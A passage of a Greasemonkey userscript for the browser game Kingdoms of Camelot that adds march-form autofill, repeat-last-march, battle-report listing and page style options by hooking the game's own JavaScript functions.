				if (ksxDebug) GM_log("MarchExtenderPlugin.march.transportTools.atTransportTemplateChanged(" + sender + ")");
				ui = new ksx.koc.MarchUI();
				var selectedValue = sender.options[sender.selectedIndex].value;
				GM_log("Seleted: \"" + selectedValue + "\"");
				if (selectedValue == "") return;
				var res = selectedValue.split(",");
				if (res.length != 5) {
					GM_log("ERROR: Buttler configuration! confEntry:\"" + selectedValue + "\"");
					return;
				}
				ui.gold.value = ""; ksx.tools.typeKeys2(ui.gold, res[0]);
				ui.food.value = ""; ksx.tools.typeKeys2(ui.food, res[1]);
				ui.wood.value = ""; ksx.tools.typeKeys2(ui.wood, res[2]);
				ui.stone.value = ""; ksx.tools.typeKeys2(ui.stone, res[3]);
				ui.ore.value = ""; ksx.tools.typeKeys2(ui.ore, res[4]);

				ksx.plugins.MarchExtender.march.transportTools.calculateFastestTroopsForTransport();
			},
			className: "MarchExtenderPlugin+TransportTools"
		},
		
		marchTools: {
			uiElement: null,
			uiElementId: "ksxMarchTools",

			hide: function () {
				if(ksxDebug) GM_log("MarchExtenderPlugin.march.marchTools.hide()");
				var t = ksx.plugins.MarchExtender.march.marchTools;
				uiElement = document.getElementById(t.uiElementId);
				if (!uiElement) return;
				uiElement.style.display = "none";
			},

			show: function (visible) {
				if (ksxDebug) GM_log("MarchExtenderPlugin.march.marchTools.show(" + Boolean(visible) + ")");
				var t = ksx.plugins.MarchExtender.march.marchTools;
				uiElement = document.getElementById(t.uiElementId);
				if (!uiElement) uiElement = t.create();
				t.uiElement.style.display = ((visible) ? "" : "none");
			},

			create: function (visible) {
				if (ksxDebug) GM_log("MarchExtenderPlugin.march.marchTools.create(" + Boolean(visible) + ")");
				var t = ksx.plugins.MarchExtender.march.marchTools;
				t.uiElement = document.getElementById(t.uiElementId);
				if (t.uiElement) return t.uiElement;
				if(typeof(culang.MarchTools)=="undefined") culang.MarchTools=(LangOptions.culang=="de") ? "MARSCH TOOLS" : "MARCH TOOLS";
				if(typeof(culang.SaveAllways)=="undefined") culang.SaveAllways=(LangOptions.culang=="de") ? "Immer Speichern" : "Save Allways";
				if(typeof(culang.SaveMarch)=="undefined") culang.SaveMarch=(LangOptions.culang=="de") ? "Marsch Speichern" : "Save March";
				var myString = " \
					<div class='section' > \
						<div class='section_title'>{%MarchTools%}</div> \
						<div class='section_content' > \
							<input id='ksxMarchExtenderMarchDescription' type='text' style='width: 300px' tooltip='name, description, comment, what ever you want'/> \
							<a class='buttonGreen20' style='display:inline; position:absolute;margin-left:4px' href='#' onclick='ksx.plugins.MarchExtender.march.marchTools.saveMarchDescriptionHelp();return false;'><span>?</span></a> \
							<br/><br/> \
							<a class='button20' href='#' onclick='ksx.plugins.MarchExtender.saveConfig();return false;'><span>{%SaveMarch%}</span></a> \
							<input id='ksxMarchExtenderMarchSaveAllways' type='checkbox' /> \
							<label for='ksxMarchExtenderMarchSaveAllways'>{%SaveAllways%}</label>\
							<a class='buttonGreen20' style='display:inline; position:absolute;margin-left:4px' href='#' onclick='ksx.plugins.MarchExtender.march.marchTools.saveMarchHelp();return false;'><span>?</span></a>\
						</div> \
					</div> \
					";
				myString=culang.doTranslate(myString);
				var modalAttackTransport = ksx.tools.getElement("modal_attack_transport");
				t.uiElement = ksx.Builder.Element("div", myString);
				t.uiElement.setAttribute("id", t.uiElementId);
				t.uiElement.style.display = ((visible) ? "" : "none");
				modalAttackTransport.parentNode.appendChild(t.uiElement);
				
				var saveAllways=ksx.tools.getElement("ksxMarchExtenderMarchSaveAllways");
				saveAllways.checked='checked';
				var marchDescription=ksx.tools.getElement("ksxMarchExtenderMarchDescription");
				marchDescription.text='';
				
				return t.uiElement;
			},

			saveMarchDescriptionHelp: function () {
				//TODO KSX
				//ksx.Builder.showDialog("Vordefinierte Transporte", "Enth?lt ein Liste mit vordefinierte Transporten. Truppentrainingstransporte sind berechnet f?r 4 H?tten.");
			},			
			saveMarchHelp: function () {
				//TODO KSX
				//ksx.Builder.showDialog("Vordefinierte Transporte", "Enth?lt ein Liste mit vordefinierte Transporten. Truppentrainingstransporte sind berechnet f?r 4 H?tten.");
			},


			className: "MarchExtenderPlugin+MarchTools"
		},

		attachXYPaste: function (xId, yId, func) {
			// thx (c) unchanged from [KoC Attack - Deutsch] 
			var x = document.getElementById(xId);
			if (!x) {
				//this.Log('Auto Attack: kann X Koordinaten Box nicht finden: ' + xId);
				return;
			}
			var attached = x.getAttribute('KOCpasteAttached');
			if (attached) return;
			x.setAttribute('maxlength', '20');

			var onchange = function () {
				var xValue = x.value.trim();
				var xI = /^\s*([0-9]+)[\s|,|-|.]+([0-9]+)/.exec(xValue);
				if (xI) {
					var y = document.getElementById(yId);
					x.value = xI[1];
					y.value = xI[2];

					if (func != undefined) func(xI[0], xI[1]);
				}
			};
			x.setAttribute('KOCpasteAttached', true);
			x.addEventListener('keyup', function () { onchange(); }, false);
			x.addEventListener('change', function () { onchange(); }, false);
		},
		show: function (type, x, y, troops, res) {
			// marchType: 1-Transport, 2-Reinforce, 3-Scout, 4-Attack, 5-Reassign
			// x,y
			// troops: array[12]
			// res: array[gold,food,wood,stone,ore]
			if (ksxDebug) GM_log("MarchExtenderPlugin.newMarch(...)");
			if (type === 'repeatlast' || type === 'repeatlast!') {
				var s = GM_getValue("LastMarch_" + ksx.koc.getServerId());
				if (!s) { /*No configuration*/return; };
				var cfg = ksx.JSON.parse(s);
				type = cfg[0];
				if (!x) x = cfg[1]; // param x will overwride cfg value
				if (!y) y = cfg[2]; // param y will overwride cfg value
				troops = cfg[3];
				res = cfg[4];
				if (!type) type = 1/*Transport*/;
			}
			ksx.plugins.MarchExtender.march.modalattack(type, x, y);
			ksx.plugins.MarchExtender.march.fill(type, x, y, troops, res);
		},
		
		modalattack: function (type, x, y) {
			//WORKARROUND for NaN error. open the march with 'attack' und then switch to other tab
			GM_log("modalattack type:" + type);
			ksx.tools.doUnsafeWindow("modal_attack(" + 4 + ", '" + x + "', '" + y + "')", true);
			//add tab handler
			for (var i = 1; i < 6; i++) document.getElementById('modal_attack_tab_' + i).addEventListener('click', ksx.plugins.MarchExtender.march.atMarchTypeChanged, false);
			ksx.tools.click("modal_attack_tab_" + type);
			ksx.plugins.MarchExtender.march.type = type;
			if (typeof ksx.plugins.MarchExtender.original_modal_attack === "undefined") ksx.plugins.MarchExtender.march.init(type); //WORKAROUND if hooks not enabled
		},
		
		init: function (type) {
			if (typeof type == "undefined") type = ksx.koc.getCurrentMarchType();

			//add "March" click handler
			document.getElementById('btnMarch').addEventListener('click', ksx.plugins.MarchExtender.march.atMarchClicked, false);

			//TODO: create option
			ksx.tools.uncheck("modal_attack_supplyfilter_checkbox");

			//TODO: create option
			ksx.plugins.MarchExtender.march.transportTools.show((type == 1/*Transport*/ || type == 2/*Reinforce*/ || type == 5/*Reassign*/));
			ksx.plugins.MarchExtender.march.marchTools.show(true);
			
			if (!ksx.compatibility.disableMarchXYPaste)
				ksx.plugins.MarchExtender.march.attachXYPaste('modal_attack_target_coords_x', 'modal_attack_target_coords_y');
		},
		saveConfig: function () {
			if (ksxDebug) GM_log("MarchExtenderPlugin.saveMarchConfig()");
			var t = ksx.plugins.MarchExtender.march.transportTools;
			ui = new ksx.koc.MarchUI();

			var cfg = [
				ui.getMarchType(),
				ui.targetCoordsX.value, ui.targetCoordsY.value,
				[ui.unitIpt1.value, ui.unitIpt2.value, ui.unitIpt3.value, ui.unitIpt4.value, ui.unitIpt5.value, ui.unitIpt6.value, ui.unitIpt7.value, ui.unitIpt8.value, ui.unitIpt9.value, ui.unitIpt10.value, ui.unitIpt11.value, ui.unitIpt12.value],
				[ui.gold.value, ui.food.value, ui.wood.value, ui.stone.value, ui.ore.value],
				[]
			];

			var s = ksx.JSON.stringify(cfg);
			/*if (ksxDebug) */GM_log("Save 'LastMarch': " + s);
			GM_setValue("LastMarch_" + ksx.koc.getServerId(), s);
		},

		fill: function (type, x, y, troops, res) {
			if (ksxDebug) GM_log("MarchExtenderPlugin.march.fill("+type+","+x+","+y+",["+troops+"],["+res+"])");
			var ui = new ksx.koc.MarchUI();
			if (!type) type = 1;

			if (type == 1/*Transport*/) {
				ksx.tools.uncheck(ui.supplyfilterCheckbox);
			}

			if(ui.unitAvail1 >0){ ui.unitIpt1 .value = ""; ksx.tools.typeKeys2(ui.unitIpt1, troops[0]);}
			if(ui.unitAvail2 >0){ ui.unitIpt2 .value = ""; ksx.tools.typeKeys2(ui.unitIpt2, troops[1]);}
			if(ui.unitAvail3 >0){ ui.unitIpt3 .value = ""; ksx.tools.typeKeys2(ui.unitIpt3, troops[2]);}
			if(ui.unitAvail4 >0){ ui.unitIpt4 .value = ""; ksx.tools.typeKeys2(ui.unitIpt4, troops[3]);}
			if(ui.unitAvail5 >0){ ui.unitIpt5 .value = ""; ksx.tools.typeKeys2(ui.unitIpt5, troops[4]);}
			if(ui.unitAvail6 >0){ ui.unitIpt6 .value = ""; ksx.tools.typeKeys2(ui.unitIpt6, troops[5]);}
			if(ui.unitAvail7 >0){ ui.unitIpt7 .value = ""; ksx.tools.typeKeys2(ui.unitIpt7, troops[6]);}
			if(ui.unitAvail8 >0){ ui.unitIpt8 .value = ""; ksx.tools.typeKeys2(ui.unitIpt8, troops[7]);}
			if(ui.unitAvail9 >0){ ui.unitIpt9 .value = ""; ksx.tools.typeKeys2(ui.unitIpt9, troops[8]);}
			if(ui.unitAvail10>0){ ui.unitIpt10.value = ""; ksx.tools.typeKeys2(ui.unitIpt10, troops[9]);}
			if(ui.unitAvail11>0){ ui.unitIpt11.value = ""; ksx.tools.typeKeys2(ui.unitIpt11, troops[10]);}
			if(ui.unitAvail12>0){ ui.unitIpt12.value = ""; ksx.tools.typeKeys2(ui.unitIpt12, troops[11]);}

			ui.targetCoordsX.value = ""; ksx.tools.typeKeys2(ui.targetCoordsX, x);
			ui.targetCoordsY.value = ""; ksx.tools.typeKeys2(ui.targetCoordsY, y);

			if (type == 1/*Transport*/ || type == 2/*Reinforce*/ || type == 5/*Reassign*/) {
				ui.gold.value = ""; ksx.tools.typeKeys2(ui.gold, res[0]);
				ui.food.value = ""; ksx.tools.typeKeys2(ui.food, res[1]);
				ui.wood.value = ""; ksx.tools.typeKeys2(ui.wood, res[2]);
				ui.stone.value = ""; ksx.tools.typeKeys2(ui.stone, res[3]);
				ui.ore.value = ""; ksx.tools.typeKeys2(ui.ore, res[4]);
			}

			if (type == 4/*Attack*/) {
				// ui.attackKnight.selectedIndex = ui.attackKnight.options.length - 1; // select last
			}
		},

		atMarchTypeChanged: function (evt) {
			if (ksxDebug) GM_log("MarchExtenderPlugin.atMarchTypeChanged");
			type = parseInt(evt.target.id.substr(17)); //modal_attack_tab_{marchType}
			var ui = new ksx.koc.MarchUI();

			//TODO create config option
			ksx.plugins.MarchExtender.march.transportTools.show((type == 1/*Transport*/ || type == 2/*Reinforce*/ || type == 5/*Reassign*/));

			if (type == 3/*Scout*/) {
				//TODO create config option	
				if(ui.unitAvail3 >0){ui.unitIpt3.value = ""; ksx.tools.typeKeys2(ui.unitIpt3, 1);}
			}
			if (type == 1/*Transport*/) {
				//TODO create config option
				ksx.tools.uncheck(ui.supplyfilterCheckbox);
			}

			switch (type) {
				case 1/*Transport*/: break;
				case 2/*Reinforce*/: break;
				case 3/*Scout    */: break;
				case 4/*Attack   */: break;
				case 5/*Reassign */: break;
				default: break;
			}
		},
		atMarchClicked: function () {
			if (ksxDebug) GM_log("MarchExtenderPlugin.atMarchClicked()");
			var saveAllways=ksx.tools.getElement("ksxMarchExtenderMarchSaveAllways");
			if(saveAllways.checked='checked')
				ksx.plugins.MarchExtender.march.saveConfig();
		},

		className: "MarchExtenderPlugin+March"
	},

	this.unsafeModalAttackHook = function (marchType, x, y) {
		//if(ksxDebug) GM_log("MarchExtenderPlugin.unsafeModalAttackHook(..)");

		/*ORIGINAL CALL*/
		var ret = ksx.plugins.MarchExtender.original_modal_attack(marchType, x, y);
		/*WORKAROUND  [Power]*/
		if (typeof attackDialog_hook === "function") attackDialog_hook(marchType, x, y); // 

		ksx.plugins.MarchExtender.march.init(marchType);
		return ret;
	};
	
	this.unsafeModalAttackCheckHook=function() {
		/*WORKAROUND [Power]*/ 
		if(typeof modalAttack_hook === "function") modalAttack_hook();
		/*NEWCALL*/ 
		ksx.plugins.MarchExtender.saveMarchConfig();
		/*ORIGINALCALL*/
		var ret=ksx.plugins.MarchExtender.original_modal_attack_check();
		return ret;
	};

	this.setHooks = function () {
		if(ksxDebug) GM_log("MarchExtenderPlugin.setHooks");
		if (typeof unsafeWindow.modal_attack != "function") {/*UUPS*/GM_log("Check KoC: 'modal_attack' not found!");return;}

		thisPlugin.original_modal_attack = unsafeWindow.modal_attack;
		unsafeWindow.modal_attack = this.unsafeModalAttackHook;

//      not used! event handler attached instead
//		thisPlugin.original_modal_attack_check = unsafeWindow.modal_attack_check;
//		unsafeWindow.modal_attack_check = this.unsafeModalAttackCheckHook;
	};
	
	// @PDX: Schau mal bitte, wenn ich meine hooks setze, funktionieren deine hooks nicht mehr.
	// die WORKAROUNDs rufen als Notl?sung zwar deine Funktionen auf, aber eine sauber L?sung  ist das leider nicht.
	thisPlugin.setHooks();

	if (ksx.plugins.Toolbar != null) {
		var ksxMarchExtenderRepeatOpen = document.getElementById("ksxMarchExtenderRepeatOpen");
		if (ksxMarchExtenderRepeatOpen) ksxMarchExtenderRepeatOpen.addEventListener("click", function () { thisPlugin.march.show('repeatlast', '', '', [], []); }, false);
		var ksxMarchExtenderRepeatMarch = document.getElementById("ksxMarchExtenderRepeatMarch");
		if (ksxMarchExtenderRepeatMarch) ksxMarchExtenderRepeatOpen.addEventListener("click", function () { thisPlugin.march.show('repeatlast!', '', '', [], []); }, false);
	}
}

function ReportsPlugin(ksx) {
	var thisPlugin = this;
	var t = {
		maxPages: 1, //t.maxPages = document.getElementById("pagesSelect").value;
		totalPages: 0
	};

	this.show = function () {
		t.totalPages = 0;
		t.maxPages = 10;
		thisPlugin.searchReports("", 1);
	};

	this.searchReports = function (rslt, pageNum) {
		if (t.totalPages == 0) {
			var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
			params.pf = 0;
			params.group = "a";
			params.pageNo = 1;

			new ksx.koc.MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/listReports.php" + unsafeWindow.g_ajaxsuffix, {
				method: "post",
				parameters: params,
				onSuccess: function (rslt) {
					if (rslt.ok) {
						GM_log("ReportsPlugin.searchReports.onSuccess OK");
						t.totalPages = parseInt(rslt['totalPages']);
					} else {
						GM_log("ReportsPlugin.searchReports.onSuccess ERR");
					}
				},
				onFailure: function () {
					GM_log("ReportsPlugin.searchReports.onFailure");
				}
			}, false);
		}

		if (t.maxPages == 101) t.maxPages = t.totalPages;

		if (parseInt(pageNum) <= t.maxPages) {
			//document.getElementById('searchStatus').innerHTML = pageNum;
			GM_log(">>ReportsPlugin.getReports " + pageNum);
			thisPlugin.getReports(pageNum);
		} else {
			//document.getElementById('searchStatus').innerHTML = "Fertig!";
			GM_log("ReportsPlugin Fertig");
		}
	};

	this.getReports = function(pageNum) {
//		var t = Tabs.msg;
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.pf = 0;
		params.group = "a";
		params.pageNo = pageNum;

		var req=new ksx.koc.MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/listReports.php" + unsafeWindow.g_ajaxsuffix, {
			method: "post",
			parameters: params,
			onSuccess: function(rslt) {
				if (rslt.ok) {
					GM_log("ReportsPlugin.getReports.onSuccess OK");
					GM_log(">>ReportsPlugin searchInReports " + pageNum);
					thisPlugin.searchInReports(rslt, pageNum);
				}else {
					GM_log("ReportsPlugin.getReports.onSuccess ERR");
				}
			},
			onFailure: function () {
				GM_log("ReportsPlugin.getReports.onFailure");
			}
		}, false);
	};

	this.searchInReports = function(rslt, pageNum) {
//		var t = Tabs.msg;

		var myarray = rslt['arReports'];
		var results = document.getElementById("ReportResults");

		for (k in myarray) {
			if (getMyAlliance()[0] != myarray[k]['side1AllianceId'] || myarray[k]['marchType'] == 2) {
				t.content += '<TR><TD><A><SPAN onclick="getReport(' + myarray[k]['reportId'] + ',' + myarray[k]['side0TileType'] + ')">'+culang.show+'</span></a></td>';
				t.content += '<TD>' + pageNum + '</td>';
				t.content += '<TD>' + unsafeWindow.formatDateByUnixTime(myarray[k]['reportUnixTime']) + '</td>';
				t.content += '<TD>';
				if (rslt['arPlayerNames']['g' + myarray[k]['side1PlayerId']] == "M") t.content += 'Lord ';
				if (rslt['arPlayerNames']['g' + myarray[k]['side1PlayerId']] == "F") t.content += 'Lady ';
				t.content += rslt['arPlayerNames']['p' + myarray[k]['side1PlayerId']] + '</td>';
				t.content += '<td>' + pdxkoordlink(myarray[k]['side1XCoord'], myarray[k]['side1YCoord']) + '</td>';
				t.content += '<TD>' + rslt['arAllianceNames']['a' + myarray[k]['side1AllianceId']] + '</td>';
				if (myarray[k]['marchType'] == 2) t.content += '<TD><FONT color="00CC33">'+culang.rptreinforce+'</font></td>';
				if (myarray[k]['marchType'] == 3) t.content += '<TD><FONT color="FF9933">'+culang.scout+'</font></td>';
				if (myarray[k]['marchType'] == 4) t.content += '<TD><FONT color="FF0033">'+culang.rptattack+'</font></td>';
				t.content += '<TD>';
				if (rslt['arPlayerNames']['g' + myarray[k]['side0PlayerId']] == "M") t.content += 'Lord ';
				if (rslt['arPlayerNames']['g' + myarray[k]['side0PlayerId']] == "F") t.content += 'Lady ';
				t.content += rslt['arPlayerNames']['p' + myarray[k]['side0PlayerId']] + '</td>';
				if (myarray[k]['side0TileType'] == 51) t.content += '<TD>Stadt (' + myarray[k]['side0TileLevel'] + ')</td>';
				else t.content += '<TD><FONT color="#909090"> Wild (' + myarray[k]['side0TileLevel'] + ')</font></td>';
				t.content += '<td>' + pdxkoordlink(myarray[k]['side0XCoord'], myarray[k]['side0YCoord']) + '</td>';
			}
		}
		results.innerHTML = t.content;
		pageNum++;
		t.searchReports(rslt, pageNum);
	};
}

// END KOC BUTTLER

/**********************************************************************************/
/************ KOC POWER - PDXSTARTUP **********************************************/
/********************************************************************************/
function pdxStartup (){
  defMode = {};
  clearTimeout (pdxStartupTimer);
  if (unsafeWindow.pdxLoaded)
  return;
  var metc = getClientCoords(document.getElementById('main_engagement_tabs'));
  if (metc.width==null || metc.width==0){
    pdxStartupTimer = setTimeout (pdxStartup, 1000);
    return;
  }
	unsafeWindow.pdxLoaded = true;
	KOCversion = anticd.getKOCversion();
	logit ("KOC version: "+ anticd.getKOCversion());

	Seed = unsafeWindow.seed;
	
	var styleBox = document.createElement('div'); 
	styleBox.innerHTML = '<div class=pdxStyleSel><center><table><tr><td style="background:none; border: none;"><a  title="'+culang.visitKoCPower+'" href='+userscriptURL+' target="_blank"><img  src=http://koc-power-pdx.googlecode.com/svn/trunk/img/koc-power-multilang-300x60.png></a></td><td style="background:none; border: none; width:100%;"><div class=pdxVersions><font color='+Colors.pdxQuickInfoData+'><b>' + Version + '</b></font><center><div id=pdxLangFlag></div></center></div></td></tr></table></center><DIV id=pdxTimeInfos style="margin-top:-10px;"><table style="background:none; border:none;"><tr><td style="background:none; border:none;"><div id=pdxTime></div></td><td style="background:none; border:none;"><font color='+Colors.pdxQuickInfoData+'><span id=pdxTimeZone></span></font></td></tr></table></div><img title="'+culang.selStyleNow+'" height=18 width=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/theme.png> '+ htmlSelector({pdxBackground11:''+culang.kocscripts+'', pdxKoCOld: ''+culang.oldkocsty+'', pdxOwnBackground:''+culang.WPownBGopt+'', pdxOwnBackgrounddark:''+culang.WPownBGoptdark+'', pdxBackgroundColordark: ''+culang.WPbgcolordark+'', pdxBackgroundColor:''+culang.WPbgcolor+'', pdxBackground1:''+culang.WPfbblue+'', pdxBackground2:''+culang.WPfbworld+'', pdxBackground3:''+culang.WPubuntu+'', pdxBackground5:''+culang.WPStripes+'', pdxBackground6:''+culang.WPwebt+'', pdxBackground7:''+culang.WPdesign+'', 	pdxBackground8:''+culang.WPfblogo+'', pdxBackground9:''+culang.WPfblogobig+'', pdxBackground10:''+culang.WPmech+'', pdxBackground12:''+culang.WPtechno+'', pdxBackground13:''+culang.WPmetalplate+'', pdxBackground14:''+culang.WPmetalplateblue+'', pdxBackground15:''+culang.WPmetalplatesilver+'', pdxBackground16:''+culang.WPmetalplatesilver2+'', pdxBackground17:''+culang.WPmetalplatesilverdark+'', pdxBackground18:''+culang.WPmetalplatesilver3+'', pdxBackground19:''+culang.WPoldpaper3+'', pdxBackground20:''+culang.WPoldpaper+'', pdxBackground21:''+culang.WPpaperbackground1+'', pdxBackground22:''+culang.WPpaperbackground2+'', pdxBackground23:''+culang.WPcrumpledpaper2+'', pdxBackground24:''+culang.WPcrumpledpaper3+'', pdxBackground25:''+culang.WPcrumpledpaper+'', pdxBackground26:''+culang.WPlinetexture1+'', pdxBackground27:''+culang.WPlinetexture2+'', pdxBackground28:''+culang.WPlinetexture3+'', pdxBackground29:''+culang.WPlinetexture4+'', pdxBackground30:''+culang.WPlinetexture5+'', pdxBackground31:''+culang.WPlinetexture6+'', pdxBackground32:''+culang.WPlinetexture7+'', pdxBackground33:''+culang.WPlinetexture8+'', pdxBackground34:''+culang.wood+'', pdxBackground35:''+culang.WPwooddark+'', pdxBackground36:''+culang.wood+' 2', pdxBackground37:''+culang.WPleaf+'', pdxBackground38:''+culang.WPclouds+'', pdxBackground40:''+culang.WPattention+'', pdxBackground41:''+culang.WPdarkred+'', pdxBackground42:''+culang.WPdarkgray+'', pdxBackground43:''+culang.WPtech+'', pdxBackground44:''+culang.WPheart+'', pdxBackground45:''+culang.WPbutterflyblue+'', pdxBackground46:''+culang.WPblue+'', pdxBackground47:''+culang.WPsmoke+'', pdxBackground48:''+culang.WPabstraccolor+'', pdxBackground49:''+culang.WPabstracdark+'', pdxBackground50:''+culang.WPabstracgreen+'', pdxBackground51:''+culang.WPabstracgreen2+'', pdxBackground52:''+culang.WPabstracrosa+'', pdxBackground53:''+culang.WPbluedrop+'', pdxBackground54:''+culang.WPelectronicmonochro+'', pdxBackground55:''+culang.WPoctoredux+'', pdxBackground56:''+culang.WPpinkcheetah+'', pdxBackground57:''+culang.WPrubysundial+'', pdxBackground58:''+culang.WPseamlessflower+'', pdxBackground59:''+culang.WPstrawflowers+'', pdxBackground60:''+culang.WPvictoriandamask1+'', pdxBackground61:''+culang.WPvictoriandamask2+'', pdxBackground62:''+culang.WPvictoriandamask3+'', pdxBackground63:''+culang.WPvictoriandamask4+'', pdxBackground64:''+culang.WPmodernwarfare+'' },Options.pdxBackgroundStyle,'id=pdxStyleSelector') +'  </center><a title="'+culang.updLatest+'" href=http://userscripts.org/scripts/source/104137.user.js target="_blank"><img  height=18 width=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/update24x24.png></a></div>'; 
	document.getElementById('kocmain').parentNode.insertBefore(styleBox,document.getElementById('kocmain').nextSibling)

	var infoBox = document.createElement('div');
	infoBox.innerHTML = '<div class=pdxInfoBox>'+culang.pdxInfoBox+'</div>';
	document.getElementById('kocmain').parentNode.insertBefore(infoBox,document.getElementById('kocmain').nextSibling)

	document.getElementById('pdxStyleSelector').addEventListener ('change', function(){
         Options.pdxBackgroundStyle = document.getElementById('pdxStyleSelector').value;
         GM_setValue ('Options2_??', JSON2.stringify(Options));
		 saveOptions();
		 reloadKOC();
      },false);
/******************************** STYLE OPTIONS **********************/

	if (Options.showMightKoCBugFix==true) var showMightKoCBugFix = '	#mainbody div#kochead.kocHeader div.taskbar div.rightColumn div.avatarInfo div.avatarStats div.avatarGlory { margin-left:30px; } .kocHeader .avatarStats .avatarLevel { padding-top:1px; left: -2px;  top: 35px;} .kocHeader .avatarMight, .kocHeader .avatarGlory {padding-left:1px;}';
	if (Options.showResKoCBugFix==true) var showResKoCBugFix = '.kocmain .mod_cityinfo #cityinfo_1 table .grw {left: 600px;    margin-top: 25px;    position: fixed;    text-align: right;    width: 60px;} .kocmain .mod_cityinfo #cityinfo_1 table tbody tr td {    background-color: transparent;    border-bottom: 1px solid transparent;}';
	if (Options.pdxLangFlag) { document.getElementById('pdxLangFlag').innerHTML = '<img height=18 width=17 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/'+culang.langflag+'-24x24.png title="'+culang.pdxLangInfoNote+'">'; }
	if (Options.pdxTime) { document.getElementById('pdxTime').innerHTML = ''+getDateStrWithDOW()+''; }

	if (Options.hideKoCBar) var hideKoCButtons = '.topNav { display:none; height: 16px;padding: 0 0 0 20px; position: relative; top: 3px;}';
	if (Options.hideFriends) var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none; float: left; height: 100px;    position: relative;   width: 36px;} .kocmain .panel_friendlist .panel_list {display: none;  float: left;  height: 115px;  overflow-x: hidden;  position: relative;   width: 688px;} .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 307px; position: absolute;  top: -60px; width: 760px;}';
	if (Options.hideKoCHeader) var hideKoCHeader = '.kocHeader { display: none; background: none repeat scroll 0 0 transparent;  color: #FFFFFF;  height: 98px; width: 760px; }';

	// KOC SCRIPTS DESIGN show/hide KoC Stuff
	if (Options.hideFriends==true && Options.hideKoCBar==true && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none;} .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 437px; position: absolute;  top: -255px; width: 760px; height: 1px;} ';}
